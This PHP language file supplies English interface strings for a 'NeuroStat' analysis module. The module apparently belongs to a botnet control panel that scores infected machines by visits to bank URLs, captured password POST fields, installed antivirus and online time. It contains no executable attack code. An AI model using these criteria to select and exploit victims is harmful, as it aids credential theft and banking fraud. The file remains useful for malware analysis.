<?php
# _blockAnalysesList
define('LNG_NEUROSTAT_ANALYSESLIST',                                                            'Researches');
define('LNG_NEUROSTAT_ANALYSESLIST_ADD',                                                        'New analysis');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_NAME',                                                    'Name');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_DAYS',                                                    'Days');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_BOTONLINE',                                               'Bot was online, Days');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_DATES',                                                   'Dates');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_ACCOUNT',                                                 'Account');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_PROFILES',                                                'Profiles');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_BOTS',                                                    'Bots');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_LAUNCHED',                                                'Launched');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_STATE',                                                   'State');
define('LNG_NEUROSTAT_ANALYSESLIST_DAYS_NOTODAY',                                               ', not today');
define('LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_NEVER',                                             'Never');
define('LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_IDLE',                                              'Idle');

# _blockProfilesList
define('LNG_NEUROSTAT_PROFILE_LIST',                                                            'Profiles');
define('LNG_NEUROSTAT_PROFILE_LIST_ADD',                                                        'New profile');
define('LNG_NEUROSTAT_PROFILE_LIST_TH_NAME',                                                    'Name');
define('LNG_NEUROSTAT_PROFILE_LIST_TH_CRITERIA',                                                'Criteria');

# _blockCriteriaList
define('LNG_NEUROSTAT_CRITERIA_LIST',                                                           'Criteria');
define('LNG_NEUROSTAT_CRITERIA_LIST_ADD',                                                       'New criterion');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_TITLE',                                                  'Title');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_SETUP',                                                  'Setup');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_DAYS_LIMIT',                                             'Days');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_POINTS',                                                 'Points');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_STATISTICAL_METHOD',                                     'Statistical method');
define('LNG_NEUROSTAT_CRITERIA_LIST_EACH',                                                      'each');

# Misc
define('LNG_NEUROSTAT_ANALYSIS_FINISHED',                                                       'NeuroAnalysis "<a href=":analysis_link" target="_blank">:analysis_name</a>" finished in: :time');
define('LNG_NEUROSTAT_ANALYSIS_BOTID_FINISHED',                                                 'NeuroAnalysis of bot "<a href=":analysis_link" target="_blank">:botId</a>" finished in: :time');

# CRUD: Analysis
define('LNG_NEUROSTAT_ANALYSIS_NAME',                                                            'Name');
define('LNG_NEUROSTAT_ANALYSIS_PROFILES',                                                        'Profiles');
define('LNG_NEUROSTAT_ANALYSIS_DAYS',                                                            'Days');
define('LNG_NEUROSTAT_ANALYSIS_DAYS_DESCR',                                                      'The number of days to parse reports for');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE',                                                       'Bot online, days');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE_DESCR',                                                 'Analyze only bots which were online during the last X days');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE_HINT',                                                  'The number of days. Empty: analyze all bots');
define('LNG_NEUROSTAT_ANALYSIS_NOTODAY',                                                         'Ignore today\'s reports');
define('LNG_NEUROSTAT_ANALYSIS_NOTODAY_LABEL',                                                   'Don\'t parse today\'s reports to prevent table locking');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT',                                                         'Account');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS',                                                    'URLs');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS_DESCR',                                              'Only process bots which have visited any of the specified URLs. Wildcard `?*` supported.');
define('LNG_NEUROSTAT_ANALYSIS_BUTTON_UPDATE',                                                   'Update');
define('LNG_NEUROSTAT_ANALYSIS_BUTTON_CREATE',                                                   'Create');

# CRUD: Profile
define('LNG_NEUROSTAT_PROFILE_NAME',                                                            'Name');
define('LNG_NEUROSTAT_PROFILE_CRITERIA',                                                        'Criteria');
define('LNG_NEUROSTAT_PROFILE_BUTTON_UPDATE',                                                   'Update');
define('LNG_NEUROSTAT_PROFILE_BUTTON_CREATE',                                                   'Create');

# CRUD: All criteria
define('LNG_NEUROSTAT_CRITERION_TITLE',                                                         'Title');
define('LNG_NEUROSTAT_CRITERION_TITLE_HINT',                                                    'Title string, arbitrary');
define('LNG_NEUROSTAT_CRITERION_TYPE',                                                          'Criterion');
define('LNG_NEUROSTAT_CRITERION_TYPE_HINT',                                                     'The criterion algorithm to use');
define('LNG_NEUROSTAT_CRITERION_SETS',                                                          'Criterion settings');
define('LNG_NEUROSTAT_CRITERION_SETS_UNDEFINED',                                                'Criterion type not defined! Please pick one to have additional settings');

define('LNG_NEUROSTAT_CRITERION_POINTS',                                                        'Points');
define('LNG_NEUROSTAT_CRITERION_POINTS_HINT',                                                   'Points given to a bot when this criteria is met');
define('LNG_NEUROSTAT_CRITERION_NEGATED',                                                       'Negated');
define('LNG_NEUROSTAT_CRITERION_NEGATED_HINT',                                                  'Negate the condition: give points when the condition is not met');
define('LNG_NEUROSTAT_CRITERION_DAYSLIMIT',                                                     'Days Limit');
define('LNG_NEUROSTAT_CRITERION_DAYSLIMIT_HINT',                                                'Limit this criterion to reports for the last X days');
define('LNG_NEUROSTAT_CRITERION_STAT',                                                          'Statistical method');
define('LNG_NEUROSTAT_CRITERION_STAT__NO',                                                      'No: Each match gives N points');
define('LNG_NEUROSTAT_CRITERION_STAT__SUM',                                                     'Sum: The total number of matching reports');
define('LNG_NEUROSTAT_CRITERION_STAT__DAYS',                                                    'Days: The number of days with matching reports');
define('LNG_NEUROSTAT_CRITERION_STAT__AVG_DAY',                                                 'Avg/Day: Average matches rate per day');
define('LNG_NEUROSTAT_CRITERION_STAT__AVG_WEEK',                                                'Avg/Week: Average matches rate per week');
define('LNG_NEUROSTAT_CRITERION_STAT__DAYS_WEEK',                                               'Days/Week: Average active days per week');
define('LNG_NEUROSTAT_CRITERION_STAT_HINT',
                                                    'Select the statistical method to apply to the collected results. N points are given to a bot if ... '.
                                                    '<ul>'.
                                                    '<li><b>No</b>: ... a report has met the criterion ; '.
                                                    '<li><b>sum</b>: ... the number of matching reports exceeds the threshold value ; '.
                                                    '<li><b>days</b>: ... the number of active days (with matching reports) exceeds the threshold value ; '.
                                                    '<li><b>avg/day</b>: ... the average number of matching reports per day exceeds the threshold ; '.
                                                    '<li><b>avg/week</b>: ... the average number of matching reports per week exceeds the threshold ; '.
                                                    '<li><b>days/week</b>: ... the average number of active days (with matching reports) per week exceeds the threshold ; '.
                                                    '</ul>'
);
define('LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD',                                            'Threshold value condition');
define('LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD_HINT',
                                                    'When using a statistical method, specify a threshold value and the comparison operator.'.
                                                    'N points will be assigned to a bot only when the aggregated value meets this condition'
);
define('LNG_NEUROSTAT_CRITERION_BUTTON_UPDATE',                                                 'Update');
define('LNG_NEUROSTAT_CRITERION_BUTTON_CREATE',                                                 'Create');

# CRUD: Bot criteria
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT',                                                   'Bot: First report time');
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT_DESCR',                                             'Condition on the time of first report from the bot');
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT_SET_DAYS',                                          'Was .. days ago');
define('LNG_NEUROSTAT_CRITERION_LASTREPORT',                                                    'Bot: Last report time');
define('LNG_NEUROSTAT_CRITERION_LASTREPORT_DESCR',                                              'Condition on the time of last report from the bot');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE',                                               'Bot: Average weekly online time');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_DESCR',                                         'Condition on the bot\'s average online time per week');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_SET_HOURS',                                     'Hours per week');

# CRUD: Report criteria
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE',                                                   'Report type');
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE_DESCR',                                             'Matches the report type');
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE_SET_TYPE',                                          'Report type');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS',                                               'Report contents');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_DESCR',                                         'Matches the generic report contents');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS',                                  'Report content masks');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS_HINT',                             'One mask per line. Wildcard `?*` supported. Example: password*');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT',                                                      'Installed software');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_DESCR',                                                'Matches the installed software lists');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE',                                         'Software masks');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE_HINT',                                    'One mask per line. Wildcard `?*` supported. Example: Avast*');
define('LNG_NEUROSTAT_CRITERION_TASKLIST',                                                      'Running applications');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_DESCR',                                                'Matches the running application lists (from `tasklist` CMD command)');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE',                                         'Application process name masks');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE_HINT',                                    'One mask per line. Wildcard `?*` supported. Example: Avast*.exe');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL',                                                 'HTTP Visit URL');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_DESCR',                                           'Matches the bot\'s visit to one of the specified URL masks');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK',                                     'URL masks');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK_HINT',                                'One per line. Wildcard `?*` supported. Example: htt?://*.bank.com/*');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA',                                                 'HTTP POST data');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_DESCR',                                           'Matches the bot\'s POST to one the specified URL mask, with any of the provided POST field masks');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK',                                    'POST field masks');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK_HINT',                               'One per line. Wildcard `?*` supported. Example: password*');
